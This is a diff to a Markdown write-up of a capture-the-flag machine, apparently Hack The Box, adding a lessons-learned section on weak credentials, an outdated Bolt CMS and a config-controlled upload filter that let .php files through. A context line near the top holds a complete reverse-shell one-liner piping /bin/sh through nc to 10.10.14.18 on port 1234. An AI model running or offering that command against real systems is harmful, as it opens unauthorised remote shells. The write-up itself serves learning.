@@ -220,6 +220,16 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.18 1234 >/tmp/f
 
 ## <span style="color:#9933FF">What Did I learn from this Machine?👀  
 
+### <span style="color:#9933FF"> Weak Credentials
+* The password for the docker registry was admin/admin.  
+* Also, the password for the bolt account was easily crackable "strawberry". Is it true that the harder the password is the harder it is to crack it's hash? I mean it makes sense because when we thing about it if the password is hard it might not be in a wordlist at all. Which means we can't crack it.
+
+### <span style="color:#9933FF"> Old Software  
+* The bolt version was not up to date which led to me exploiting a file upload vulnerability in that version.  
+
+### <span style="color:#9933FF"> The Ability to Download php files  
+* Also, maybe the fact that the admin was able to edit the config.yml file, which gave the ability to manipulate allowed file extensions.  
+* Maybe the fact that the extension checking only relied on the configuration file. I think even if the admin can choose whatever extensions they want some extensions should always be restricted like the `.php` extension as an example.
 
 <br/><br/>
 
